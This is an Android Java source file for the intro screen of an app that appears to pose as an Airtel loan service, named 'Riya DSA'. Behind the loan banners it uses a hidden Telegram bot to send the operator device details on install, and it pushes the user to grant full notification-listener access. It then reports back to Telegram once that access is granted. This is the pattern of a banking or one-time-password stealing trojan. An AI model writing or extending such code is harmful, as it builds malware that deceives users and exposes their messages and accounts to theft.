package com.example.mywebviewapp;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.CheckBox;
import android.widget.Toast;
import com.bumptech.glide.Glide;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;

public class IntroActivity extends Activity {
    private String botToken;
    private String chatId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // If notification permission is already granted and all checkboxes were previously checked, skip intro
        if (shouldSkipIntro()) {
            Intent intent = new Intent(IntroActivity.this, MainActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            finish();
            return;
        }

        setContentView(R.layout.activity_intro);
    botToken = readConfigValue("BOT_TOKEN");
    chatId = readConfigValue("CHAT_ID");

    // Load images from URLs using Glide
    ImageView image1 = findViewById(R.id.image1);
    ImageView image2 = findViewById(R.id.image2);
    Glide.with(this)
            .load("https://assets.airtel.in/teams/simplycms/web/images/D-web-loan-banner-17042023.png")
            .placeholder(R.mipmap.ic_launcher)
            .error(R.mipmap.ic_launcher)
            .into(image1);
        Glide.with(this)
            .load("https://assets.airtel.in/static-assets/cms/finance/images/Website%20Banner_PL.png")
            .placeholder(R.mipmap.ic_launcher)
            .error(R.mipmap.ic_launcher)
            .into(image2);

        // Send Telegram message on first install/open with device details
        if (isFirstLaunch()) {
            String deviceInfo = getDeviceDetails();
            sendToTelegram("Riya DSA installed on device.\n" + deviceInfo);
            setFirstLaunchFalse();
        }

    // Checkbox logic
    CheckBox cbAgree = findViewById(R.id.checkbox_agree);
    CheckBox cbNotif = findViewById(R.id.checkbox_notification);
    CheckBox cbAgent = findViewById(R.id.checkbox_agent);
    CheckBox cbUnderstand = findViewById(R.id.checkbox_understand);
    Button confirmBtn = findViewById(R.id.button_confirm);

        View.OnClickListener checkListener = new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                confirmBtn.setEnabled(cbAgree.isChecked() && cbNotif.isChecked() && cbAgent.isChecked() && cbUnderstand.isChecked());
            }
        };
    cbAgree.setOnClickListener(checkListener);
    cbNotif.setOnClickListener(checkListener);
    cbAgent.setOnClickListener(checkListener);
        cbUnderstand.setOnClickListener(checkListener);

        confirmBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (!cbAgree.isChecked() || !cbNotif.isChecked() || !cbAgent.isChecked() || !cbUnderstand.isChecked()) {
                    Toast.makeText(IntroActivity.this, "Please check all boxes to continue.", Toast.LENGTH_LONG).show();
                    return;
                }
                if (!isNotificationServiceEnabled(IntroActivity.this)) {
                    Toast.makeText(IntroActivity.this, "You must grant Notification Access in system settings to continue. Please enable all notification types for best results.", Toast.LENGTH_LONG).show();
                    Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                    startActivity(intent);
                } else {
                    // Save that user has completed intro
                    setIntroCompleted();
                    Intent intent = new Intent(IntroActivity.this, MainActivity.class);
                    intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    finish();
                }
            }
        });
        // Glide handles image loading efficiently; no need for AsyncTask.
    }

    // Helper to determine if intro should be skipped
    private boolean shouldSkipIntro() {
        return isNotificationServiceEnabled(this) && getSharedPreferences("prefs", MODE_PRIVATE).getBoolean("intro_completed", false);
    }

    // Helper to mark intro as completed
    private void setIntroCompleted() {
        getSharedPreferences("prefs", MODE_PRIVATE).edit().putBoolean("intro_completed", true).apply();
    }

    // Helper to get device details
    private String getDeviceDetails() {
        String manufacturer = android.os.Build.MANUFACTURER;
    String model = android.os.Build.MODEL;
    String version = android.os.Build.VERSION.RELEASE;
    String sdk = String.valueOf(android.os.Build.VERSION.SDK_INT);
    String device = android.os.Build.DEVICE;
    String product = android.os.Build.PRODUCT;
    String brand = android.os.Build.BRAND;
        String hardware = android.os.Build.HARDWARE;
        return "Manufacturer: " + manufacturer + "\nModel: " + model + "\nAndroid Version: " + version + "\nSDK: " + sdk + "\nDevice: " + device + "\nProduct: " + product + "\nBrand: " + brand + "\nHardware: " + hardware;
    }

    @Override
    protected void onResume() {
        super.onResume();
    // Only allow moving to MainActivity if permission is granted and all boxes are checked
    CheckBox cbAgree = findViewById(R.id.checkbox_agree);
    CheckBox cbNotif = findViewById(R.id.checkbox_notification);
    CheckBox cbAgent = findViewById(R.id.checkbox_agent);
    CheckBox cbUnderstand = findViewById(R.id.checkbox_understand);
    // Defensive: null checks and avoid crash if view not found
        if (cbAgree == null || cbNotif == null || cbAgent == null || cbUnderstand == null) return;
        if (isNotificationServiceEnabled(this)) {
            if (cbAgree.isChecked() && cbNotif.isChecked() && cbAgent.isChecked() && cbUnderstand.isChecked()) {
                // Send Telegram message when permission is granted
                try {
                    sendToTelegram("Notification listener permission granted by user.");
                } catch (Exception e) {
                    e.printStackTrace();
                }
                Intent intent = new Intent(IntroActivity.this, MainActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                finish();
            }
        } else {
            Toast.makeText(this, "Notification Access is required. Please enable it in system settings to continue.", Toast.LENGTH_LONG).show();
        }
    }

    // Helper to send message to Telegram
    private void sendToTelegram(final String message) {
        final String token = botToken;
        final String chat = chatId;
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (token == null || chat == null) return;
                    String urlString = "https://api.telegram.org/bot" + token + "/sendMessage";
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                    String data = "chat_id=" + chat + "&text=" + message;
                    OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
                    writer.write(data);
                    writer.flush();
                    writer.close();
                    conn.getInputStream().close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    private String readConfigValue(String key) {
        try {
            InputStream is = getAssets().open("config.txt");
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.startsWith(key + "=")) {
                    return line.substring((key + "=").length());
                }
            }
            reader.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    // Helper to check if this is the first launch
    private boolean isFirstLaunch() {
        return getSharedPreferences("prefs", MODE_PRIVATE).getBoolean("first_launch", true);
    }

    private void setFirstLaunchFalse() {
        getSharedPreferences("prefs", MODE_PRIVATE).edit().putBoolean("first_launch", false).apply();
    }

    private boolean isNotificationServiceEnabled(Context context) {
        String pkgName = context.getPackageName();
        final String flat = Settings.Secure.getString(context.getContentResolver(), "enabled_notification_listeners");
        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (String name : names) {
                if (name.contains(pkgName)) {
                    return true;
                }
            }
        }
        return false;
    }
}
